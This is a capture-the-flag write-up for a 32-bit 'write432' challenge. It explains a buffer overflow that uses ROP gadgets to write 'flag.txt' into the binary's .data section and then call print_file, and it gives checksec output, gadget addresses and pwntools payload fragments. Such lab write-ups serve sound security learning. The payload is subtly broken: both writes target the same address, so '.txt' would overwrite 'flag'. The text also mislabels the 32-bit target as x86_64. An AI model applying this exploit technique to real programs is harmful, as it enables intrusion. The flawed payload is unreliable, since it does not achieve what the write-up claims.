# write432

In this problem, there is a function in shared library named print_file, which will open the file with its argument. The problem here is that this argument, for example "flag.txt" is too long to store in a x86_64 register. Therefore, we need to find some space to store the argument for calling print_file.

First, check the security of the binary:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

```
Store the argument in stack is impossible because the ASLR in linux, which will make stack, heap address unknown to us.

A straightfoward solution is to store the argument in the data section of the ELF file, then make the print_file to get argument from that address.

Since PIE is disabled, data section address is known for us.   

We can use readelf command to find the address of the data section.
```
...
.data = 0x804a018 (dataSect)
...
```
Then, we need to find some rop to help us store the string "flag.txt" to the data section. We can find a gadget with two pop operations pop r1, pop r2, which means that these two registor can be controled by us. Secondly, we need to find a mov operation with the format like mov ptr[r1] [r2], so we can move the value in register r2 to the place we want to store.

Use ROPgadget to find possible gadgets.
```
ROPgadget --binary write432
```
We find two suitable gadgets.
```
...
0x080485aa : pop edi ; pop ebp ; ret (gadget1)
0x08048543 : mov dword ptr [edi], ebp ; ret (gadget2)
...
```
Firstly, we need to pop the address of data section and string "flag.txt" into edi, ebp by using gadget #pop edi ; pop ebp ; ret, and then use gadget #mov dword ptr [edi], ebp ; ret to move the string value to the data section.

Since x86 register can only store 4 bytes value one time, and the string we want to write to the data section is "flag.txt", which is 8 bytes, we need to do the write operation two times.

Next, using ghidra, we know that print_file function obtain argument from stack. Therefore, we only need to push the address of data section into stack. 

We can jump to the print_file function address, same as previous problem, we can find print_file address from plt table, and then push the string ino stack.
```
peda$ plt
...
Breakpoint 3 at 0x80483d0 (print_file@plt)
...
```
There is one thing we need to notice, print_file get argument from stack[+4], which means that the string should be pushed into stack after 4 bytes offset.
```
                **************************************************************
                *                          FUNCTION                          *
                **************************************************************
                undefined __cdecl print_file(char * param_1)
undefined         AL:1           <RETURN>
char *            Stack[0x4]:4   param_1                                 XREF[2]:     00010772(R), 
...
```
Now, we can build our payload, same as problem before, there is a 40 bytes buffer, and 4 bytes ebp.
```
'A'*44
```
Pop the address of data section and string "flag" into edi, ebp, and move the string to data section.
```
p32(gadget1) + p32(dataSect) + b'flag' + p32(gadget2)
```
Pop the address of data section and string ".txt" into edi, ebp, and move the string to data section.
```
p32(gadget1) + p32(dataSect) + b'.txt' + p32(gadget2)
```
Jump to print_file function.
```
p32(print_file@plt)
```
push the address of data section and offset into stack.
```
b'A'*4 + p32(dataSect)
```
Write exploit.py using pwntools, and we obtain the flag:
```
ROPE{a_placeholder_32byte_flag!}
```

